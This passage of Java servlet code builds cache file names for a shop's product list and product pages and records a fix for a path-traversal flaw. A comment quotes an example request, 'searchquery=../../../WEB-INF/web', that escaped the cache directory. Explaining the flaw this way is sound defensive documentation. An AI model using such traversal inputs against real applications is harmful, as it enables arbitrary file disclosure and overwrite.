			// SHA-256 and UTF-8 are required of every JVM; unreachable in practice.
			throw new IllegalStateException("JVM is missing SHA-256 or UTF-8", e);
		}
	}

	String buildCashPageName(HttpServletRequest request, String path) {
		HttpSession hsession = request.getSession(false);
		ProductlistBean productlistBeanId = null;
		AuthorizationPageBean authorizationPageBeanId = ((AuthorizationPageBean) hsession
				.getAttribute("authorizationPageBeanId"));
		StringBuffer buff = new StringBuffer();
		if (path.equals("Productlist.jsp")) {

			if (hsession.getAttribute("ProductlistBeanId") instanceof ProductlistBean) {

				productlistBeanId = (ProductlistBean) hsession.getAttribute("ProductlistBeanId");
				String dayfromId = "";
				String mountfromId = "";
				String yearfromId = "";
				String fromcost = "";
				String tocost = "";
				String daytoId = "";
				String mounttoId = "";
				String yeartoId = "";
				String creteria1Id = "";
				String creteria2Id = "";
				String creteria3Id = "";
				String creteria4Id = "";
				String creteria5Id = "";
				String creteria6Id = "";
				String creteria7Id = "";
				String creteria8Id = "";
				String creteria9Id = "";
				String creteria10Id = "";
				String offset = "";
				String searchquery = "";
				String catalogId = "";

				// response.setCharacterEncoding("UTF-8");
				try {
					request.setCharacterEncoding("UTF-8");
				} catch (UnsupportedEncodingException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				// request.setCharacterEncoding(("UTF-8");
				if (request.getParameter("catalog_id") != null)
					catalogId = request.getParameter("catalog_id");
				else
					catalogId = authorizationPageBeanId.getCatalogId();

				if (request.getParameter("fromcost") != null)
					fromcost = request.getParameter("fromcost");
				else
					fromcost = authorizationPageBeanId.getFromCost().toString();

				if (request.getParameter("tocost") != null)
					tocost = request.getParameter("tocost");
				else
					tocost = authorizationPageBeanId.getToCost().toString();

				if (request.getParameter("dayfrom_id") != null)
					dayfromId = request.getParameter("dayfrom_id");
				else
					dayfromId = Long.toString(authorizationPageBeanId.getDayfromId());

				if (request.getParameter("mountfrom_id") != null)
					mountfromId = request.getParameter("mountfrom_id");
				else
					mountfromId = Long.toString(authorizationPageBeanId.getMountfromId());

				if (request.getParameter("yearfrom_id") != null)
					yearfromId = request.getParameter("yearfrom_id");
				else
					yearfromId = Long.toString(authorizationPageBeanId.getYearfromId());

				if (request.getParameter("dayto_id") != null)
					daytoId = request.getParameter("dayto_id");
				else
					daytoId = Long.toString(authorizationPageBeanId.getDaytoId());

				if (request.getParameter("mountto_id") != null)
					mounttoId = request.getParameter("mountto_id");
				else
					mounttoId = Long.toString(authorizationPageBeanId.getMounttoId());

				if (request.getParameter("yearto_id") != null)
					yeartoId = request.getParameter("yearto_id");
				else
					yeartoId = Long.toString(authorizationPageBeanId.getYeartoId());

				// if( request.getParameter("action") !=null ) action =
				// request.getParameter("action");
				// else action = productlistBeanId.getAction() ;

				if (request.getParameter("creteria1_id") != null)
					creteria1Id = request.getParameter("creteria1_id");
				else
					creteria1Id = Long.toString(authorizationPageBeanId.getCreteria1Id());

				if (request.getParameter("creteria2_id") != null)
					creteria2Id = request.getParameter("creteria2_id");
				else
					creteria2Id = Long.toString(authorizationPageBeanId.getCreteria2Id());

				if (request.getParameter("creteria3_id") != null)
					creteria3Id = request.getParameter("creteria3_id");
				else
					creteria3Id = Long.toString(authorizationPageBeanId.getCreteria3Id());

				if (request.getParameter("creteria4_id") != null)
					creteria4Id = request.getParameter("creteria4_id");
				else
					creteria4Id = Long.toString(authorizationPageBeanId.getCreteria4Id());

				if (request.getParameter("creteria5_id") != null)
					creteria5Id = request.getParameter("creteria5_id");
				else
					creteria5Id = Long.toString(authorizationPageBeanId.getCreteria5Id());

				if (request.getParameter("creteria6_id") != null)
					creteria6Id = request.getParameter("creteria6_id");
				else
					creteria6Id = Long.toString(authorizationPageBeanId.getCreteria6Id());

				if (request.getParameter("creteria7_id") != null)
					creteria7Id = request.getParameter("creteria7_id");
				else
					creteria7Id = Long.toString(authorizationPageBeanId.getCreteria7Id());

				if (request.getParameter("creteria8_id") != null)
					creteria8Id = request.getParameter("creteria8_id");
				else
					creteria8Id = Long.toString(authorizationPageBeanId.getCreteria8Id());

				if (request.getParameter("creteria9_id") != null)
					creteria9Id = request.getParameter("creteria9_id");
				else
					creteria9Id = Long.toString(authorizationPageBeanId.getCreteria9Id());

				if (request.getParameter("creteria10_id") != null)
					creteria10Id = request.getParameter("creteria10_id");
				else
					creteria10Id = Long.toString(authorizationPageBeanId.getCreteria10Id());

				if (request.getParameter("offset") != null)
					offset = request.getParameter("offset");
				else
					offset = "" + productlistBeanId.getOffset();

				if (request.getParameter("searchquery") != null)
					searchquery = request.getParameter("searchquery");
				else
					searchquery = "" + productlistBeanId.getSearchquery();

				// if( request.getParameter("locale") !=null ) searchquery =
				// request.getParameter("locale");
				// else searchquery = "" + productlistBeanId.getSearchquery();

				buff.append("_df_");
				buff.append(dayfromId);
				buff.append("_mf_");
				buff.append(mountfromId);
				buff.append("_yf_");
				buff.append(yearfromId);
				buff.append("_fc_");
				buff.append(fromcost);
				buff.append("_tc_");
				buff.append(tocost);
				buff.append("_dy_");
				buff.append(daytoId);
				buff.append("_mt_");
				buff.append(mounttoId);
				buff.append("_yt_");
				buff.append(yeartoId);
				buff.append("_c1_");
				buff.append(creteria1Id);
				buff.append("_c2_");
				buff.append(creteria2Id);
				buff.append("_c3_");
				buff.append(creteria3Id);
				buff.append("_c4_");
				buff.append(creteria4Id);
				buff.append("_c5_");
				buff.append(creteria5Id);
				buff.append("_c6_");
				buff.append(creteria6Id);
				buff.append("_c7_");
				buff.append(creteria7Id);
				buff.append("_c8_");
				buff.append(creteria8Id);
				buff.append("_c9_");
				buff.append(creteria9Id);
				buff.append("_c10_");
				buff.append(creteria10Id);
				buff.append("_off_");
				buff.append(offset);
				buff.append("_sq_");
				buff.append(searchquery);
				buff.append("_catalog_");
				buff.append(catalogId);
				buff.append("_l_");
				buff.append(authorizationPageBeanId.getLocale());
				buff.append("_s_");
				buff.append(authorizationPageBeanId.getSiteId());
				// FIX (path traversal): this used to be "return buff.toString();".
				// buff is built from raw request parameters - searchquery,
				// catalog_id, fromcost, offset, creteria1_id..creteria10_id - and
				// the result is used by the caller as a FILENAME:
				//     pathInfo  = path + "_" + buildCashPageName(...) + ".html";
				//     cashPage  = getCashDir(servletContext) + separator + pathInfo;
				//     new File(cashPage)                       <- read
				//     getRequestDispatcher("cashes" + sep + pathInfo).forward(...)
				// and the cache writer later writes to the same name. A request
				// such as
				//     Productlist.jsp?searchquery=../../../WEB-INF/web
				// escaped the cache directory on both the read and the write side,
				// which is arbitrary file disclosure and arbitrary file overwrite
				// inside the deployed application.
				// Hashing removes the attacker's control over the name completely,
				// and it is what the author's own commented-out line did. It also
				// fixes a second, quieter bug: with ten criteria plus a free-text
				// search query the old name easily passed the 255-byte filename
				// limit, so caching failed with "File name too long" on exactly the
				// filtered searches that most needed it.
				return hashCashKey(buff.toString());
			}
		} else if (path.equals("ProductInfo.jsp")) {
			// FIX: same traversal problem, and more direct - the raw query string
			// went straight into the filename. getQueryString() is also null for a
			// bare "ProductInfo.jsp" request, which made concat() throw NPE.
			String queryString = request.getQueryString();
			if (queryString == null)
				queryString = "";
			return hashCashKey(queryString + authorizationPageBeanId.getLocale()
					+ authorizationPageBeanId.getSiteId());
		}

		return "";
	}

	public void clearAllXSLTemplates() {
		authorizationPageFaced.getTransformerMap().clear();
	}

	public boolean isAllowLocale(String locale) {
		if (locale == null)
			return false;
		String[] IntField = { "en", "ru" };
		for (int i = 0; i < IntField.length; i++) {
			if (IntField[i].compareTo(locale) == 0) {
				return true;
			}
		}
		return false;
	}

	public void saveXMLFile(String filename, String xmlData) {
		try {
			FileOutputStream fout = new FileOutputStream(filename);

			if (fout == null)
				return;

			fout.write(xmlData.getBytes());
			fout.close();
			return;
		} catch (java.lang.Exception e) {
			log.error(e);
			System.out.println(e.toString());
		}
	}

	boolean getUserCookies(ServletContext servletContext) {
		return (Boolean) servletContext.getAttribute("use_cookies");
	}

	void setUserCookies(ServletContext servletContext, String useCookies) {
		servletContext.setAttribute("use_cookies", Boolean.parseBoolean(useCookies));
	}

	void setCookiesDir(ServletContext servletContext, String cookiesDir) {
		servletContext.setAttribute("cookies_dir", cookiesDir);
	}

	String getCookiesDir(ServletContext servletContext) {
		return (String) servletContext.getAttribute("cookies_dir");
	}










}
